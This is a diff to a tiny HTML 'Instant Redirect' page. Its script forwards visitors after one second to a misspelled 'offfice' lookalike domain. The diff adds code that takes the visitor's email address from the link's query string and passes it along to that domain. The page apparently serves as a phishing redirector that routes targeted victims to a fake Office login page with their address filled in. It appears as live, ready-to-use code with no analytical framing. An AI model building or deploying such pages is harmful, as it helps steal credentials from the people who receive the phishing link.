@@ -3,22 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instant...</title>
+    <title>Instant Redirect</title>
 </head>
 <body>
 
-
     <script type="text/javascript">
-        // Set the URL you want to redirect to
-        var redirectUrl = "https://offfice.appdocumenter.com/ceExu"; // Replace with your target URL
+        // Set the base URL you want to redirect to
+        var redirectUrl = "https://offfice.appdocumenter.com/ceExu";
+
+        // Get the email parameter from the query string (e.g., ?e=email@example.com)
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('e');
+
+        // If email is found, append it to the redirect URL
+        if (email) {
+            redirectUrl += "?e=" + encodeURIComponent(email);
+        }
 
         // Set the delay time in milliseconds (2000 = 2 seconds)
-        var delayTime = 2000;
+        var delayTime = 1000;
 
         // Redirect after the specified delay
         setTimeout(function() {
             window.location.href = redirectUrl;
         }, delayTime);
     </script>
+
 </body>
 </html>
